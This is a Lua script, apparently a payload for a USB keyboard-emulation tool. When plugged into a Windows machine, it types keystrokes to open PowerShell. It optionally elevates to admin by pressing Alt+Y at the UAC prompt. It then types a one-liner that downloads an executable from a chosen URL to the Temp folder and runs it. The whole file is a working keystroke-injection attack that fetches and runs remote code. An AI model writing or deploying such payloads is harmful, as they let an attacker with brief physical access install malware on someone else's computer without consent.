---
--- downloadrun.lua: downloads and executes a file
--- directly translated from the Java version in previous builds
---

usb = luausb.create({ id = 0, type = "keyboard" })
kb = usb.dev[1]

local file = prompt("File to download?", "https://github.com/Netdex/FlyingCursors/releases/download/1.0.0/FlyingCursors.exe")
local runAs = confirm("Task UAC", "Launch exe as admin?");

while true do
    print("idle")

    -- poll until usb plugged in
    while usb.state() == "not attached" do
        wait(1000)
    end

    print("running")
    wait(1000)

    print("opening powershell, runAs=" .. tostring(runAs))
    if runAs then
        -- when running elevated prompt sometimes it pops in background, so we need
        -- to go to the desktop
        kb.chord(MOD_LSUPER, KEY_D)
        wait(500)
        kb.chord(MOD_LSUPER, KEY_R)
        wait(2000)
        kb.string("powershell Start-Process powershell -Verb runAs\n")
        wait(3000)
        kb.chord(MOD_LALT, KEY_Y)
        wait(2000)
    else
        kb.chord(MOD_LSUPER, KEY_R)
        wait(2000)
        kb.string("powershell\n")
        wait(2000)
    end

    print("download + execute code")

    kb.string(
            "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$d=New-Object System.Net.WebClient;" ..
                    "$u='" .. file .. "';" ..
                    "$f=\"$Env:Temp\\a.exe\";$d.DownloadFile($u,$f);" ..
                    "$e=New-Object -com shell.application;" ..
                    "$e.shellexecute($f);" ..
                    "exit;\n"
    )

    print("done")
    -- poll until usb unplugged
    while usb.state() == "configured" do
        wait(1000)
    end
    print("disconnected")
end

